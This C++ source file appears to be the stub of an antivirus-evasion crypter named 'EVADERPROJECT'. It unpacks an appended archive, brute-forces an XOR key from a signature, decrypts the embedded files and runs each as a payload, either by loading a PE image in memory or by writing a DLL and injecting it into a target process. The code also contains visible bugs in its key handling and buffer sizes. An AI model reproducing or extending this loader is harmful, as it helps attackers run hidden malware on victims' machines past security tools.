#include "PackRoutines-Stub.h"
#include "../Execution//Execution.h"

const char* packerrors_str[] = {
	"Success",
	"Archive empty; no files to extract",
	"Error in supplied Path",
	"Could not create output archive file",
	"Not a valid packed file",
	"Failed while extracting one of the files",
	"Input archive file failed to open"
};

char* key;
char mainsignature[] = "EVADERPROJECT";

int KEY_SIZE;
int START_ASCII;
int END_ASCII;


int unpackfiles(char *archive, char *dest, std::vector<packdata_t> &filesList, long startPos, packcallbacks_t * pcb) {
	return unpackfilesEx(archive, dest, filesList, startPos, pcb);
}

int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList, long startPos, packcallbacks_t * pcb) {

	FILE* fpArchive = fopen(archive, "rb");

	if (!fpArchive) return packerrorCouldNotOpenArchive;

	char SIG[13];
	SIZE_T nFiles;

	char TargetProgram[80];
	int exeMethod;

	if (startPos)
		fseek(fpArchive, startPos, SEEK_SET);

	// read key length and complexcity
	fread(&KEY_SIZE, sizeof(KEY_SIZE), 1, fpArchive);
	fread(&START_ASCII, sizeof(START_ASCII), 1, fpArchive);
	fread(&END_ASCII, sizeof(END_ASCII), 1, fpArchive);
	key = new char[KEY_SIZE]();


	// read signature
	fread(SIG, sizeof(char), sizeof(SIG), fpArchive);


	// read execution method
	fread(&exeMethod, sizeof(int), 1, fpArchive);

	// read targetprogram name
	if (exeMethod != 0)
		fread(TargetProgram, sizeof(char), sizeof(TargetProgram), fpArchive);

	if (!retrieveKey(SIG, sizeof(SIG))) {
		fclose(fpArchive);
		return packerrorNotAPackedFile;
	}
		

	// read files entries count
	fread(&nFiles, sizeof(nFiles), 1, fpArchive);

	// no files?
	if (!nFiles) return (fclose(fpArchive), packerrorNoFiles);

	fread(&filesList[0], sizeof(packdata_t), nFiles, fpArchive);

	filesList.resize(nFiles);

	// loop in all files
	for (unsigned int i = 0; i < filesList.size(); i++) {

		char buffer[4096];
		packdata_t *pdata = &filesList[i];

		// trigger callback
		if (pcb && pcb->newfile)
			pcb->newfile(pdata->filename, pdata->filesize);


		strcpy_s(buffer, dest);
		strcat_s(buffer, pdata->filename);

		// how many chunks of Buffer_Size is there is in filesize?
		long size = pdata->filesize;
		long pos = 0;
		long read = 0;

		char* _image_ = new char[size*2]();

		while (size > 0){

			long toread = size > sizeof(buffer) ? sizeof(buffer) : size;
			fread(buffer, toread, 1, fpArchive);
			for (int i = 0; i < sizeof(buffer); i++) { // for loop for scrambing bits in the string 
				_image_[read + i] = buffer[i] ^ key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string
				buffer[i] = buffer[i] ^ key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string
			}
			read += toread;
			pos += toread;
			size -= toread;
			if (pcb && pcb->fileprogress)
				pcb->fileprogress(pos);
				
		}

		// Run payload
		int imSize = pdata->filesize;
		RunImage(_image_, imSize, exeMethod, TargetProgram);

		nFiles--;
	}

	fclose(fpArchive);

	return packerrorSuccess;

}


int SfxGetInsertPos(char *filename, long *pos){

	FILE *fp = fopen(filename, "rb");
	if (fp == NULL)
		return packerrorCouldNotOpenArchive;

	IMAGE_DOS_HEADER idh;

	fread((void *)&idh, sizeof(idh), 1, fp);
	fclose(fp);
	*pos = *(long *)&idh.e_res2[0];
	return packerrorSuccess;
}


bool retrieveKey(char* readSignature, int signatureSize) {

	//bruteforcing the encryption key

	char* retrievedSig = new char[signatureSize];
	int i = KEY_SIZE;

	for (int k = 0; k < KEY_SIZE; k++)
		key[k] = START_ASCII;

	while (i > -1) {

		for (int i = 0; i < signatureSize; i++) // for loop for scrambing bits in the string 
			retrievedSig[i] = readSignature[i] ^ (char)key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string

		retrievedSig[signatureSize] = '\0';

		if (!strcmp(retrievedSig, mainsignature)) return 1;

		i = KEY_SIZE - 1;
		key[i]++;

		while ((int)key[i] > END_ASCII) {
			
			key[i] = START_ASCII;
			key[--i]++;
		}

	}

	return 0;
}

int RunImage(char* Image, int imSize, int exeMethod, char* targetProgram) {

	LPCSTR pDllPath = "E:\\tmp.dll";

	if (exeMethod > 0) {
		
		FILE* fpDll = fopen(pDllPath, "wb+");

		fwrite(Image, sizeof(char), imSize, fpDll);
		fclose(fpDll);
	}

	switch (exeMethod)
	{
	case -1:
		break;
	case 0:
		RunPortableExecutable(Image);
		break;
	default:
		initializeInjection(targetProgram, pDllPath, exeMethod);
		break;
	}

	return 0;

}